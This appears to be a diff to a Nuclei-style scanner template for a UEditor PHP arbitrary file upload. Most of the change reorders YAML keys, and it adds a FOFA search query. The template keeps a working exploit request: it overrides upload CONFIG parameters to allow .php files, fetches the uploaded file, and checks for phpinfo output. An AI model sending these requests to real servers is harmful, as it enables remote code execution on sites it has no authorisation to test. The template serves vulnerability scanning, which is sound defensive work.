@@ -1,5 +1,4 @@
 id: ueditor-arbitrary-file-upload
-
 info:
   name: UEditor - PHP Arbitrary File Upload
   author: ChiragArtani
@@ -15,16 +14,36 @@ info:
     cpe: cpe:2.3:a:baidu:ueditor:*:*:*:*:*:*:*:*
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag intrusive
+    fofa-query: body="ueditor"
     max-request: 2
-    vendor: baidu
     product: ueditor
-  tags: ueditor,file-upload,rce,intrusive,vuln
-
+    vendor: baidu
+  tags: file-upload,intrusive,rce,ueditor,vuln
 variables:
-  filename: "{{rand_base(5)}}"
-
+  filename: '{{rand_base(5)}}'
 http:
-  - raw:
+  - extractors:
+      - name: vuln_path
+        regex:
+          - /ueditor/php/upload/{{filename}}\.php
+        type: regex
+      - group: 1
+        part: body
+        regex:
+          - '>PHP Version <\/td><td class="v">([0-9.]+)'
+        type: regex
+    matchers:
+      - condition: and
+        part: body_2
+        type: word
+        words:
+          - PHP Extension
+          - PHP Version
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    raw:
       - |
         POST /php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=ueditor/php/upload/{{filename}}&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]={{filename}} HTTP/1.1
         Host: {{Hostname}}
@@ -41,29 +60,3 @@ http:
       - |
         GET /php/upload/{{filename}}.php HTTP/1.1
         Host: {{Hostname}}
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body_2
-        words:
-          - "PHP Extension"
-          - "PHP Version"
-        condition: and
-
-      - type: status
-        status:
-          - 200
-
-    extractors:
-      - type: regex
-        name: vuln_path
-        regex:
-          - "/ueditor/php/upload/{{filename}}\\.php"
-
-      - type: regex
-        part: body
-        group: 1
-        regex:
-          - '>PHP Version <\/td><td class="v">([0-9.]+)'
-
